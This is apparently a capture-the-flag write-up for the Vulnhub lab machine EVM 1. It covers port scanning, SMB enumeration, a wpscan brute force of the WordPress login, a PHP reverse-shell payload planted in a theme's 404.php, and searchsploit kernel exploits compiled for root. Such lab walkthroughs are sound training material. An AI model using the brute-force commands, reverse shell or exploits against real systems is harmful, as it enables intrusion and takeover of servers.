+++
title = "Vulnhub: EVM 1"
date = "2021-03-05"
author = ""
authorTwitter = "" #do not include @
cover = ""
tags = ["Beginner", "Vulnhub", "OSCP Prep", "Password Bruteforce", "WordPress", "WPScan"]
keywords = ["", ""]
description = ""
showFullContent = false
+++

<!--more-->
{{< image src="/img/evm/evm.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

| Difficulty | Release Date | Author | Machine link |
| ---------- | ------------ | ------ | ------- |
| Beginner   | 2 Nov 2019   | Ic0de  | https://vulnhub.com/entry/evm-1,391/ |


# Summary

This was an easy box, initial foothold was on wordpress. You needed to bruteforce the admin creds
then get a reverse shell via editing a theme file to get the reverse shell. Escalating to root
was straightforward as we found the root password in a txt file. Some kernel exploits could have also
been used for privilege escalation.

# Reconnaissance

Nmap

```sh
Nmap scan report for 192.168.56.103
Host is up (0.00028s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 (RSA)
|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)
|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)
53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA RESP-CODES SASL AUTH-RESP-CODE TOP UIDL PIPELINING
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: more post-login LOGINDISABLEDA0001 ID LOGIN-REFERRALS listed IMAP4rev1 have capabilities OK ENABLE Pre-login LITERAL+ SASL-IR IDLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00
|   Domain name: \x00
|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
|_  System time: 2021-03-04T15:43:32-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-03-04T20:43:32
|_  start_date: N/A
```

# Enumeration

## Samba (139,445)

Running smbmap and smbclient there's not much there.

```sh
smbmap -R -H 192.168.56.103

smbclient -L \\192.168.56.103 -N
```

{{< image src="/img/evm/evm1.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

From enum4linux-ng we only get a username

```sh
enum4linux-ng -A -R 192.168.56.103
```

{{< image src="/img/evm/evm2.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

## HTTP (80)

Visiting the ip on the browser there's only the apache default page.

Running directory bruteforce, we discover wordpress. 

{{< image src="/img/evm/evm3.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Wordpress:

{{< image src="/img/evm/evm4.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Some of the comments hint towards bruteforcing credentials.

{{< image src="/img/evm/evm5.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Bruteforcing the login page on wordpress we get the password `24992499`

```sh
wpscan --url http://192.168.56.103/wordpress/ -U c0rrupt3d_brain -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -t 100
```

{{< image src="/img/evm/evm7.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

# Shell as www-data
With admin access we can edit one of the wordpress theme files to get a reverse shell with this php payload.

```php
<?php exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.56.1/9000 0>&1 &'")?>
```

{{< image src="/img/evm/evm6.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Loading the following url we get a reverse shell.

```
http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php
```

{{< image src="/img/evm/evm8.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Changing directory to /home there's one user's folder. Looking at all the files in this directory there's a hidden
file with the root user's password.
 
{{< image src="/img/evm/evm9.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

# Shell as root

Using the password `willy26` I switched to the root user.

{{< image src="/img/evm/evm10.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

# Extras

Privilege escalation could have also been achieved via kernel exploit.

{{< image src="/img/evm/evm11.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

The box is running ubuntu 16.04.3 and kernel version 4.4.0-87. Searching for exploits using searchsploit
we get several hits.

{{< image src="/img/evm/evm12.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Getting the first local privilege escalation script and transferring the compiled binary to the target, it works.
```sh
searchsploit -m 45010

gcc 45010.c -o pwn
```

{{< image src="/img/evm/evm13.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

The second one `44298` also works.

{{< image src="/img/evm/evm14.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}
